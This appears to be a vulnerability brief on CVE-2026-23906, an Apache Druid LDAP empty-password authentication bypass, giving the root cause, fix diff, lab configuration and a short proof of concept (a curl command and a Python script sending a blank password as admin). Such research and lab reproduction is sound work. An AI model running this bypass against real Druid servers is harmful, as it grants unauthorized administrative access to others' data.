# Intel Brief: CVE-2026-23906

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2026-23906 |
| **Title** | Apache Druid LDAP Authentication Bypass via Empty Password |
| **Affected Software** | Apache Druid |
| **Vendor** | Apache Software Foundation |
| **Affected Versions** | 0.17.0 through 35.x (all versions prior to 36.0.0) |
| **Patched Version** | 36.0.0 |
| **CVSS Score** | 9.8 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-287 (Improper Authentication) |
| **EPSS** | 0.1% (22.6th percentile) |
| **Published** | 2026-02-10 |
| **GHSA** | GHSA-q672-hfc7-g833 |

## Vulnerability Description

An authentication bypass vulnerability exists in Apache Druid's `druid-basic-security` extension when configured with LDAP authentication. The `LDAPCredentialsValidator.validateCredentials()` method does not check for empty username or empty password before performing LDAP bind operations.

When the underlying LDAP server permits anonymous binds (a common default configuration), an attacker can authenticate as any existing user by providing the user's username with an **empty password**. The LDAP server treats the empty-password bind as an anonymous bind and returns success, which Druid's validator incorrectly interprets as legitimate authentication.

### Prerequisites for Exploitation
1. `druid-basic-security` extension must be enabled
2. LDAP authenticator must be configured (`credentialsValidator.type=ldap`)
3. The underlying LDAP server must permit anonymous binds (default in many LDAP servers including OpenLDAP)

### Attack Vector
- **Network-based**: Send HTTP request to any Druid API endpoint with HTTP Basic Auth header containing a valid username and an empty password
- **No privileges required**: Completely unauthenticated attack
- **No user interaction**: Fully automated exploitation

### Impact
- Full authentication bypass to any LDAP-authenticated Druid user
- Access to all datasources and query capabilities of the impersonated user
- Potential data exfiltration, manipulation, and cluster administration if admin user is targeted
- Complete compromise of confidentiality, integrity, and availability

## Source Repository

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/apache/druid.git |
| **Primary Language** | Java |
| **Build System** | Maven (pom.xml) |
| **Vulnerable Tag** | `druid-35.0.0` (checked out) |
| **Patched Tag** | `druid-36.0.0` |

## Fix Details

### Fix Commits

| Commit | Description | Branch |
|---|---|---|
| `79f149d8991802c7f005c2fea0b1d3586780750c` | Original fix - PR #18959 by @cecemei | release branch |
| `a57afa1308f7a3168565a07a2a0990d17d8ab077` | Backport to master - PR #18997 | master |

### Fix Diff

The fix adds a 3-line check at the beginning of `validateCredentials()`:

```java
// File: extensions-core/druid-basic-security/src/main/java/org/apache/druid/security/basic/authentication/validator/LDAPCredentialsValidator.java
// Added at line 156 (beginning of validateCredentials method body):

if (username.isEmpty() || password.length == 0) {
    return null;
}
```

This prevents empty username or password from being passed to the LDAP bind operation, returning `null` (authentication failure) immediately.

## Vulnerable Code Analysis

### Vulnerable File
`extensions-core/druid-basic-security/src/main/java/org/apache/druid/security/basic/authentication/validator/LDAPCredentialsValidator.java`

### Root Cause
The `validateCredentials()` method (line 148-212) receives `username` and `password` parameters from HTTP Basic Authentication headers. Without validation, these are passed through:

1. **User lookup** (line 171): `getLdapUserObject()` searches LDAP for the username — this succeeds for valid usernames
2. **Password validation** (line 195): `validatePassword()` creates an `InitialDirContext` with `userProperties()` that sets `SECURITY_CREDENTIALS` to `String.valueOf(password)` — when password is empty (`char[0]`), this becomes an empty string
3. **LDAP anonymous bind**: LDAP RFC 4513 section 5.1.2 specifies that a bind with a DN and an empty password is an anonymous bind — many LDAP servers (including OpenLDAP by default) allow this and return success
4. **Auth success**: `validatePassword()` returns `true`, and the user is authenticated with full privileges of that LDAP user

### Key Method Chain
```
validateCredentials(authenticatorName, authorizerName, username, password)
  → getLdapUserObject(ldapConfig, dirContext, username)     // Finds user DN
  → validatePassword(ldapConfig, userDn, password)          // LDAP bind with empty password succeeds
  → new AuthenticationResult(username, ...)                  // User authenticated!
```

## Build System & Dependencies

### Build System
- **Maven** multi-module project
- Root POM: `org.apache.druid:druid:35.0.0`
- Vulnerable module: `org.apache.druid.extensions:druid-basic-security`
- JDK required: JDK 17

### Key Dependencies
- PostgreSQL (metadata storage)
- ZooKeeper (coordination)
- OpenLDAP (for LDAP auth testing)

### Docker Infrastructure
- **Official Docker Image**: `apache/druid:35.0.0` available on Docker Hub (RECOMMENDED for lab)
- **Official docker-compose.yml**: Located at `distribution/docker/docker-compose.yml`
- **LDAP test compose**: Located at `integration-tests/docker/docker-compose.ldap-security.yml`
- **LDAP test config**: Located at `integration-tests/docker/environment-configs/common-ldap`
- **LDAP bootstrap LDIF**: Located at `integration-tests/docker/ldap-configs/bootstrap.ldif`
- **OpenLDAP image**: `osixia/openldap:1.4.0`

### Lab Setup Notes
The lab needs:
1. **Apache Druid 35.0.0** with `druid-basic-security` extension loaded
2. **OpenLDAP server** (`osixia/openldap:1.4.0`) configured to allow anonymous binds (default)
3. **LDAP authenticator configured** in Druid pointing to the OpenLDAP server
4. **At least one LDAP user** (e.g., `admin` with password `priest`)
5. **PostgreSQL** for Druid metadata storage
6. **ZooKeeper** for Druid coordination

Key Druid LDAP configuration properties (from integration test configs):
```
druid_extensions_loadList=["druid-basic-security", "postgresql-metadata-storage"]
druid_auth_authenticatorChain=["ldap"]
druid_auth_authenticator_ldap_type=basic
druid_auth_authenticator_ldap_credentialsValidator_type=ldap
druid_auth_authenticator_ldap_credentialsValidator_url=ldap://openldap:389
druid_auth_authenticator_ldap_credentialsValidator_bindUser=cn=admin,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_bindPassword=admin
druid_auth_authenticator_ldap_credentialsValidator_baseDn=ou=Users,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_userSearch=(&(uid=%s)(objectClass=inetOrgPerson))
druid_auth_authenticator_ldap_credentialsValidator_userAttribute=uid
druid_auth_authenticator_ldap_authorizerName=ldapauth
druid_auth_authenticator_ldap_initialAdminPassword=priest
druid_auth_authenticator_ldap_initialInternalClientPassword=warlock
druid_auth_authorizer_ldapauth_type=basic
druid_auth_authorizer_ldapauth_initialAdminUser=admin
druid_auth_authorizer_ldapauth_initialAdminRole=admin
druid_auth_authorizer_ldapauth_roleProvider_type=ldap
druid_auth_authorizers=["ldapauth"]
druid_escalator_type=basic
druid_escalator_internalClientUsername=druid_system
druid_escalator_internalClientPassword=warlock
druid_escalator_authorizerName=ldapauth
```

LDAP bootstrap users (from `bootstrap.ldif`):
- `uid=admin,ou=Users,dc=example,dc=org` — password: `priest`
- `uid=druid_system,ou=Users,dc=example,dc=org` — password: `warlock`

## PoC Strategy

### Attack Steps
1. Deploy Druid 35.0.0 with LDAP authentication enabled and OpenLDAP with anonymous bind allowed
2. Confirm normal auth works: `curl -u admin:priest http://druid-router:8888/status`
3. Confirm wrong password fails: `curl -u admin:wrongpassword http://druid-router:8888/status`
4. **Exploit**: Send request with valid username and empty password:
   ```bash
   curl -u "admin:" http://druid-router:8888/status
   ```
5. The empty password triggers anonymous LDAP bind → LDAP returns success → Druid authenticates as admin

### Expected PoC Script Approach
```python
import requests

# Normal auth (should succeed)
r1 = requests.get("http://TARGET:8888/status", auth=("admin", "priest"))
assert r1.status_code == 200

# Wrong password (should fail with 401)
r2 = requests.get("http://TARGET:8888/status", auth=("admin", "wrongpassword"))
assert r2.status_code == 401

# EXPLOIT: Empty password (should succeed due to CVE-2026-23906)
r3 = requests.get("http://TARGET:8888/status", auth=("admin", ""))
assert r3.status_code == 200  # Authentication bypass!
```

## Public Exploits

**No public exploits found** in EIP (no Metasploit modules, ExploitDB entries, or GitHub PoCs).

This is a straightforward auth bypass that requires only a single HTTP request with empty password — trivial to exploit once the lab is set up.

## References

| Source | URL |
|---|---|
| Apache Mailing List Advisory | https://lists.apache.org/thread/2x9rv3kv6t1p577lvq4z0rl0zlt9g4sr |
| OSS-Security | http://www.openwall.com/lists/oss-security/2026/02/09/5 |
| GitHub Advisory (GHSA) | https://github.com/advisories/GHSA-q672-hfc7-g833 |
| Fix PR #18959 (original) | https://github.com/apache/druid/pull/18959 |
| Fix PR #18997 (backport to master) | https://github.com/apache/druid/pull/18997 |
| Fix Commit (master) | https://github.com/apache/druid/commit/a57afa1308f7a3168565a07a2a0990d17d8ab077 |
| Fix Commit (original) | https://github.com/apache/druid/commit/79f149d8991802c7f005c2fea0b1d3586780750c |
| Docker Hub Image | https://hub.docker.com/r/apache/druid |
| Vulnerable Source File | `extensions-core/druid-basic-security/src/main/java/org/apache/druid/security/basic/authentication/validator/LDAPCredentialsValidator.java` |
